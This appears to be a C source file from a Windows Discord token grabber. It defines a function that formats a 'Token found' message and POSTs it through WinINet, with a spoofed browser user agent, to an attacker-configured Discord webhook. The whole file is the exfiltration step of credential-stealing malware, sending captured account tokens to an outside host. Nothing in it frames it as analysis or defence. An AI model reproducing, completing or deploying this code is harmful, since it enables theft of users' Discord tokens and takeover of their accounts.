#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <wininet.h>
#include "main.h"
#include "config.h"

void execute_webhook(webhook *webhook_details, char *message)
{
	char *description = calloc(1, 1024);
	sprintf(description, "Token found: ```%s```", message);
	char *json = calloc(1, 1024);
	sprintf(json, webhook_details->json_fmt, webhook_details->username,
		PING, webhook_details->avatar_url, webhook_details->color,
		webhook_details->title, description, webhook_details->footer);
	QUICK_PRINT("Sending webhook: %s\n", json);
	HINTERNET hInternet = InternetOpenA(
		"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnectA(hInternet, "discord.com",
					      INTERNET_DEFAULT_HTTPS_PORT, NULL,
					      NULL, INTERNET_SERVICE_HTTP, 0,
					      0);
	HINTERNET hRequest = HttpOpenRequestA(
		hConnect, "POST", WEBHOOK_TOKEN, /* defined in config.h */
		NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
	// char *post_data = calloc(1, 1024);
	HttpSendRequestA(hRequest, "Content-Type: application/json",
			 strlen("Content-Type: application/json"), json,
			 strlen(json));
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	free(description);
	free(json);
}
